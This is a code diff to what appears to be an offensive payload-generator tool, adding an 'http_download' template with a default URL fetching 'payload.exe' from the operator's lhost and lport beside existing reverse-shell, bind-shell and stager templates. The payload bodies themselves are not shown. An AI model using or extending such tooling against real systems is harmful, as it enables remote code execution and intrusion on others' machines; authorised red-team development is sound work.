@@ -759,6 +759,7 @@ def _load_template(name: str) -> PayloadTemplate:
         "tcp_download":   "Tools.emitter.payload_templates.tcp_download.TcpDownloadTemplate",
         "tcp_stager":     "Tools.emitter.payload_templates.tcp_stager.TcpStagerTemplate",
         "bind_shell":     "Tools.emitter.payload_templates.bind_shell.BindShellTemplate",
+        "http_download":  "Tools.emitter.payload_templates.http_download.HttpDownloadTemplate",
     }
     if name not in registry:
         raise ValueError(
@@ -780,6 +781,7 @@ _CONFIG_TO_LABEL: dict[str, str] = {
     "command": "cmd",
     "src_path": "src_path",
     "dst_path": "dst_path",
+    "url": "url",
 }
 
 
@@ -826,6 +828,8 @@ def _apply_config_overrides(manifest: Manifest, config: TemplateConfig) -> Manif
         config.src_path = "C:\\source.txt"
     if config.dst_path is None:
         config.dst_path = "C:\\dest.txt"
+    if config.url is None:
+        config.url = f"http://{config.lhost}:{config.lport}/payload.exe"
 
     if not changed:
         return manifest
@@ -1189,7 +1193,7 @@ def main() -> None:
     parser.add_argument("manifest", help="Path to manifest YAML file")
     parser.add_argument(
         "--template",
-        choices=["reverse_shell", "run_command", "copy_file", "copy_then_run", "move_then_run", "tcp_download", "tcp_stager", "bind_shell"],
+        choices=["reverse_shell", "run_command", "copy_file", "copy_then_run", "move_then_run", "tcp_download", "tcp_stager", "bind_shell", "http_download"],
     )
     parser.add_argument("--out", default="emitter_out", help="Output directory")
     parser.add_argument("--lhost", default="127.0.0.1", metavar="IP|IFACE",
@@ -1198,6 +1202,7 @@ def main() -> None:
     parser.add_argument("--command", default=None)
     parser.add_argument("--src", default=None)
     parser.add_argument("--dst", default=None)
+    parser.add_argument("--url", default=None, help="URL for http_download template")
     parser.add_argument("--no-assemble", action="store_true")
     parser.add_argument(
         "--encode", action="store_true",
@@ -1211,6 +1216,7 @@ def main() -> None:
         command=args.command,
         src_path=args.src,
         dst_path=args.dst,
+        url=args.url,
     )
 
     result = build(
